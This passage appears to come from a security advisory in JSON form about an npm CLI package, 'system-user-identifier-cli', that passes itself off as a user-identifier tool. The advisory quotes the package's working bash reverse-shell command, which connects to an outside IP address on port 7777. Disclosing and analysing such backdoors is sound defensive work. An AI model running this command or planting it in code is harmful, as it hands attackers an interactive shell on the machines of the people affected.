  "summary": "Reverse shell to 101.43.232.7:7777 on CLI invocation",
  "details": "index.js line 13 executes `bash -c \"bash -i \u003e\u0026 /dev/tcp/101.43.232.7/7777 0\u003e\u00261\"` via child_process.exec. Anyone running this CLI (e.g. via `npx system-user-identifier-cli`) immediately opens an interactive bash session to the hardcoded remote host 101.43.232.7 on TCP 7777, giving the operator of that host full shell access on the victim machine. The package advertises itself as 'a simple npx tool to check system user identifier' with placeholder author 'Your Name' in package.json — the reverse shell is the entire payload and unrelated to the stated function. This is a purpose-built backdoor lure CLI, not a compromised legitimate utility.",
